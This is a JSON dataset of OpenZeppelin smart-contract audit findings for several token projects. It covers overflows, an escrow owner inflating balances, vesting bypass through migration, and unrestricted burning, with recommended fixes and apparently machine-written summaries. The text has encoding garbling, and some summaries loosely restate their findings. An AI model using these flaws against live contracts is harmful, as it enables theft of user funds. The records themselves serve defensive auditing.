charge of accumulating the sum. For an extremely large list of users and amounts, the variable `totalBonus` may reach its maximum possible value and finally overflow (*i.e.* start again from 0). In this scenario, an inconsistency between the total bonus sum and each userâ€™s bonus amount would be reached.\n\n\nIn the second case, an unsafe math operation in the [`payManyUsers`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L61) function could lead to an integer underflow. After the contract is deployed, the storage variable [`nextUserToBePaid`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L11) equals 0. When calling [`payManyUsers`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L61) , if 0 was passed as the value of the `batchSize` variable (or the function was externally called without parameters) , the unsigned variable `idTo` would be assigned the result of the operation 0 + 0 â€“ 1, resulting in an underflow and a stored value of 2Â²âµâ¶ â€“ â€“ While in this case the [immediately followin](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L65)  [`if`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L65) [`clause`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L65) would prevent something unexpected to happen, this approach is error-prone and not advised.\n\n\nConsider using [OpenZeppelinâ€™s](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/math/SafeMath.sol)  [`SafeMath`](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/math/SafeMath.sol) library to avoid underflows/overflows when doing mathematical operations.\n\n\n***Update:** the `SafeMath` library is now being used throughout.*",
      "summary": "\nThe Airdrop contract contains a series of arithmetic operations which are not being addressed with caution. This can lead to attempts to store numbers outside the range of the data types of their target variables, resulting in integer overflows/underflows. \n\nThe first case is related to an assignment to a storage variable inside a loop in the addManyUsers function. This function iterates through a _recipients array of addresses and a paired _amounts array of uint256â€˜s. If an extremely large list of users and amounts is used, the variable totalBonus may reach its maximum possible value and finally overflow, resulting in an inconsistency between the total bonus sum and each userâ€™s bonus amount.\n\nThe second case involves an unsafe math operation in the payManyUsers function which could lead to an integer underflow. If 0 is passed as the value of the batchSize variable, the unsigned variable idTo would be assigned the result of the operation 0 + 0 â€“ 1, resulting in an underflow and a stored value of 2Â²âµâ¶ -1.\n\nTo avoid underflows/overflows when doing mathematical operations, consider using the OpenZeppelin's SafeMath library. The library is now being used throughout.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11878",
      "title": "The Escrowâ€™s owner can arbitrarily increase the balance of any job without spending RNDRÂ tokens",
      "impact": "HIGH",
      "content": "In the`Escrow` contract, the address of the associated token contract is tracked by the [`renderTokenAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L17) variable. The owner of the `Escrow` is allowed to change this variable at any time by calling [`changeRenderTokenAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L55). If the owner called [`changeRenderTokenAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L55) passing the address of an account controlled by them as a parameter, they would therefore be allowed to call [`fundJob`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L87) from that account and arbitrarily increase any job balance, at any point in time, without spending any tokens.\n\n\nConsider analyzing the removal of the [`changeRenderTokenAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L55) function, or at least properly documenting the rationale behind its inclusion in the contract, so users are aware of such a dangerous scenario. While an attempt to do so was found in [`Escrow.sol`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L52) , where a comment states that the function â€œ*[â€¦] is included as a failsafe*â€, the issues that this mechanism would prevent from occurring are never explained.\n\n\n***Update:** an event is now [emitted](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L84) when the `changeRenderTokenAddress` function is called, and [documentation](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L73) was added explaining the rationale for having this function.*",
      "summary": "\nThis bug report outlines an issue with the `Escrow` contract, which is used to track the address of the associated token contract. The owner of the contract is allowed to change this variable at any time by calling `changeRenderTokenAddress`. If the owner passes the address of an account controlled by them as a parameter, they would be able to call `fundJob` from that account and increase any job balance without spending any tokens. \n\nIt is recommended to remove the `changeRenderTokenAddress` function or properly document the rationale behind its inclusion in the contract, so users are aware of the potential risks. An event is now emitted when the `changeRenderTokenAddress` function is called, and documentation was added explaining the rationale for having this function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11952",
      "title": "Missing full sanity checks on adding accredited investors",
      "impact": "LOW",
      "content": "It is possible to `addAccreditedInvestor` with `minInvest` being greater than `maxCumulativeInvest`. Although this configuration will be recorded properly, it will throw an exception on [line 92](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeePresale.sol#L92) of the `buyTokens` function, therefore preventing the investor to take a part into the sale.\n\n\nWe recommend adding an extra precondition `require( minInvest &lt;= maxCumulativeInvest)` in [line 119](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeePresale.sol#L119) so any potential errors are detected as early as possible.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11951",
      "title": "Validate MigrationAgent setting",
      "impact": "LOW",
      "content": "The [`setMigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L100) function from [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) does not check if the `agent.qbxSourceToken` matches the address of the contract from which the function is executed. Linking to a `MigrationAgent` that was configured to work with a different token may corrupt the migration process.\n\n\nWe recommend checking the precondition `require(_agent.qbxSourceToken == address(this))` in [line 102](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L102) to avoid being in an inconsistent state.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11950",
      "title": "Vesting logic implemented directly in the tokenÂ contract",
      "impact": "LOW",
      "content": "The vesting logic is currently implemented in the `QiibeeToken` in the form of a base `VestedToken` contract. These features are going to be used by a limited number of buyers and for a restricted amount of time only. Having complex logic included directly in the token contract may not only cause compatibility issues with blockchain explorers and exchanges, but it may also increase the potential attack surface.\n\n\nWe would suggest extracting the vesting logic into a separate contract as implemented in the OpenZeppelin [pull request](https://github.com/OpenZeppelin/zeppelin-solidity/issues/274).\n\n\n***Update:** The Qiibee team explained, that because of legal matters, they prefer to keep both functionalities within a single contract that controls token issuance.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11949",
      "title": "Constant names incompatible with the ERC20Â standard",
      "impact": "MEDIUM",
      "content": "[`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol) declares the obligatory [`ERC20`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) standard parameters as uppercase constants: [`SYMBOL`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L19), [`NAME`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L21), [`DECIMALS`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L23). This conflicts with the official specification that requires the names to be lowercase: `symbol`, `name`, `decimals`.\n\n\nConsider renaming constants to lowercase, so they are compliant with the official [`ERC20`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) standard.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "\nQiibeeToken is a contract that follows the ERC20 standard, which is a standard for tokens on the Ethereum blockchain. The QiibeeToken contract declares the necessary parameters for the ERC20 standard as uppercase constants, however, the official specification requires the names to be in lowercase. This bug report suggests that the constants should be renamed to lowercase, so they are compliant with the official ERC20 standard. The bug has since been fixed in a commit, making the QiibeeToken contract compliant with the ERC20 standard.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11948",
      "title": "Unchecked math operations",
      "impact": "MEDIUM",
      "content": "There are three unchecked math operations inside the migration function in lines [114](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L114)â€“[116](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L116)Â . Itâ€™s always better to be safe and perform operations with correctness assertions.\n\n\nConsider rigorously checking for under and overflows for all of the arithmetic operations. We recommend using the [`SafeMath`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/SafeMath.sol) library from OpenZeppelin.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "\nThis bug report is about an issue found in the migration function of the QiibeeToken.sol file, located on lines 114-116. The issue is that there are three unchecked math operations in the function, which could lead to incorrect results, or even under/overflows. To fix this issue, the OpenZeppelin SafeMath library should be used, which provides a set of math operations that are rigorously checked for under/overflows. The bug has now been fixed in the 25efdbf5bc29de12a724450c540218f6c8e59129 commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11947",
      "title": "Token minting is not synchronized with MigrationAgent",
      "impact": "HIGH",
      "content": "Token minting leads to an inconsistent state as the `MigrationAgent` [tokenSupply](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) is never increased after being set in the constructor. The discrepancy between the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) and the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) states, breaks the [`safetyInvariantCheck`](http://safetyInvariantCheck) and corrupts the migration process.\n\n\nWe suggest enforcing that the token has finalized the minitingby adding the check `require(_qbxSourceToken.mintingFinished)` in [line 21](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) of the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol). If the team wants to continue the minting after the migration is deployed we recommend increasing the `tokenSupply` by the amount of newly created tokens.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by tracking [`newTokens`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L139) and updating the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol) state in the [`updateSupply`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol#L57) function.*",
      "summary": "\nThis bug report is about an inconsistency between the token supply in the QiibeeToken and MigrationAgent contracts. The issue is that the tokenSupply of the MigrationAgent is never increased after being set in the constructor, leading to a discrepancy between the two contracts. This breaks the safetyInvariantCheck and corrupts the migration process.\n\nTo fix this issue, a check was added to the MigrationAgent contract that the token has finalized minting. Additionally, if the team wants to continue minting after the migration is deployed, the tokenSupply must be increased by the amount of newly created tokens. This was fixed in a commit by tracking newTokens and updating the MigrationAgent state in the updateSupply function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11946",
      "title": "Migration bypasses vesting restrictions",
      "impact": "HIGH",
      "content": "All of the users are allowed to [`migrate`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L109) their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. Moreover, once they migrate the tokens any vesting restrictions are removed.\n\n\nWe recommend only allowing `transferableTokens` to be available for migrations. An alternative solution is to implement a new `migateVestedTokens` function that will copy the vesting configuration to the migration target contract.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by [checking](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L120) if the amount of tokens is within the `transferableTokens` limit at the moment of migration.*",
      "summary": "\nThis bug report is about the Qiibee Token contract, which allows all users to migrate their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. This can cause issues since any vesting restrictions are removed during the migration process. \n\nThe recommended solution is to only allow transferable tokens to be available for migrations. An alternative solution is to create a new migrateVestedTokens function that will copy the vesting configuration to the migration target contract. \n\nThe bug has been fixed in a commit by checking if the amount of tokens is within the transferableTokens limit at the moment of migration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11945",
      "title": "Tokens burning breaks MigrationAgent contract",
      "impact": "HIGH",
      "content": "Tokens burning after the deployment of the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) creates a discrepancy between `tokenSupply` defined in the token and the migration contract, which will irreversibly break the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol). Once the `MigrationAgent` contract is deployed, it defines [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) to match the current state of `qbxSourceToken`. However, when the supply of the source token decreases after burning, the [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable is not updated causing invariants checks to fail. [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) may be corrupted by any token holder as the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function is not restricted.\n\n\nConsider restricting the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function solely to the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) owner. If this solution cannot be implemented, we suggest updating [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable of after every [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) operation as an alternative.\n\n\n***Update**: Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by both restricting the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L174) function and counting the `burntTokens`, so the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol) can [`updateSupply`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol#L57).*",
      "summary": "\nThis bug report is about an issue that occurs when the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) contract is deployed. The issue is that when tokens are burned, the `tokenSupply` defined in the token and the migration contract are not updated, causing invariants checks to fail. This can be exploited by any token holder as the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function is not restricted.\n\nThe suggested solution to this issue is to either restrict access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function solely to the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) owner or to update the [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable after every [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) operation. The issue has been resolved by restricting access to the [`burn`](https://github.com/qiibee/qb-contracts/blob",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12139",
      "title": "Code modularity",
      "impact": "LOW",
      "content": "All contracts appear in a single large file. Simpler code means easier audits, and better understanding of what each component does. Consider separating current code into small files, small contracts, and small functions. If you can separate a contract into many independent functionalities you should probably do it.\n\n\nedit: fixed by Matchpool team in the latest version of the code",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12138",
      "title": "Use OpenZeppelinâ€™s StandardToken, Ownable and SafeMath contracts",
      "impact": "LOW",
      "content": "Rewriting the same StandardToken contract for every project is prone to bringing [unexpected problems](https://medium.com/zeppelin-blog/hackergold-bug-analysis-68d893cad738). Thatâ€™s the reason why we created [OpenZeppelin](https://openzeppelin.org/) as an open-source framework of reusable and secure smart contracts. Consider using [OpenZeppelinâ€™s StandardToken](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/StandardToken.sol) instead of re-implementing it. Same with OpenZeppelinâ€™s [SafeMath](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol) and [Ownable](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/ownership/Ownable.sol), which could be used to replace repeated code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12137",
      "title": "Use latest version ofÂ Solidity",
      "impact": "LOW",
      "content": "[Current code](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L1) is written for an old version of solc (0.4.6). We recommend changing the solidity version pragma for the latest version (`pragma solidity ^0.4.10;`) to enforce latest compiler version to be used.\n\n\nedit: fixed by Matchpool team in the latest version of the code",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12136",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol) and setting a period of time where security researchers from around the globe can try to break the contractâ€™s invariants. For more info on how to implement automated bug bounties with OpenZeppelin, [see this guide](https://zeppelin-solidity.readthedocs.io/en/latest/bounty.html).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12135",
      "title": "Use ofÂ send",
      "impact": "LOW",
      "content": "Use of **send** is always risky and should be analyzed in detail. Two occurrences found in line 341 and line 374.\n\n\n* [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.\n* [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): Warning. send call in processPurchase could be moved further down. Consider changing send calls to be the last thing the function does, as itâ€™s an external interaction.\n* [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): Warning. All occurrences of send are push payments. Although we couldnâ€™t find any attack vectors on this contract, consider using [OpenZeppelinâ€™s PullPayment contract](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/payment/PullPayment.sol) to implement pull payments.\n\n\nFor more info on this problem, [see this note](https://github.com/ConsenSys/Ethereum-Development-Best-Practices/wiki/Fallback-functions-and-the-fundamental-limitations-of-using-send%28%29-in-Ethereum-&-Solidity#abuse).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12134",
      "title": "Timestamp usage",
      "impact": "MEDIUM",
      "content": "Thereâ€™s a problem with using timestamps and **now** (alias for **block.timestamp**) for contract logic, based on the fact that miners can perform some manipulation. In general, [itâ€™s better not to rely on timestamps for contract logic](https://github.com/ConsenSys/smart-contract-best-practices#timestamp-dependence). The solutions is to use **block.number** instead, and approximate dates with expected block heights and time periods with expected block amounts.\n\n\nThe **GUPToken** and **Contribution** contracts use timestamps at several points. The risk of miner manipulation, though, is really low. The potential damage is also limited: miners could only slightly manipulate when minting ends, and crowdfunding price steps. This probably wonâ€™t affect the functioning of the contract. We recommend the team to consider the potential risk of this manipulation and switch to **block.number** if necessary.\n\n\nFor more info on this topic, see [this stack exchange question](https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp).",
      "summary": "\nThis bug report highlights a potential issue with the GUPToken and Contribution contracts, which use timestamps at several points. It is recommended that developers not rely on timestamps for contract logic as miners can manipulate them. Instead, the block number should be used and expected block heights and time periods should be used to approximate dates. Although the risk of miner manipulation is low, and the potential damage is limited, the team should still consider the potential risk and switch to block.number if necessary. Further information on this topic can be found in the stack exchange question linked in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12133",
      "title": "No tests",
      "impact": "MEDIUM",
      "content": "Writing tests is a lot of work, but will save you from [regression problems](https://en.wikipedia.org/wiki/Software_regression). A regression bug appears when a previously correct component gets broken based on a recent change. Consider adding tests to catch regression errors when updating the contractâ€™s code and to further check correct functioning of contracts.\n\n\nUpdate: [Tests added by Matchpool team here](https://drive.google.com/drive/folders/0B7rVs64X9bp_aVRlRzBINW94WXc).",
      "summary": "\nRegression bugs are an important issue in software development. They occur when a previously working component of code is broken due to a recent change. To prevent this from happening, tests should be written to check the functionality of the code and to catch any regression errors. The Matchpool team has provided tests which can be used to do this. Tests are a lot of work, but they are necessary to ensure the code is functioning correctly and to prevent any regression issues from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12132",
      "title": "Use safeÂ math",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. For example, all additions and differences in StandardToken are not checked for overflows and underflows. Itâ€™s always better to be safe and perform checked operations. Even though the code uses a SafeMath class, it only supports safeMul and safeDiv, and no safe addition or difference. Consider [using a complete safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.",
      "summary": "\nThis bug report discusses the lack of checked math operations in the code. Specifically, the code does not check for overflows and underflows in its additions and differences, and the SafeMath class only supports safe multiplication and division. The report recommends using a complete safe math library or performing pre-condition checks on any math operation. This is important to ensure that the code is safe and secure, as unchecked math operations can lead to unexpected and potentially dangerous results.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Matchpool GUP TokenÂ Audit",
      "source_link": "https://blog.openzeppelin.com/matchpool-gup-token-audit-852a70330f2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12149",
      "title": "Use latest version ofÂ Solidity",
      "impact": "LOW",
      "content": "[Current code](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L1) is written for an old version of solc (0.4.4). We recommend changing the solidity version pragma for the latest version (`pragma solidity ^0.4.10;`) to enforce latest compiler version to be used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract codeÂ audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
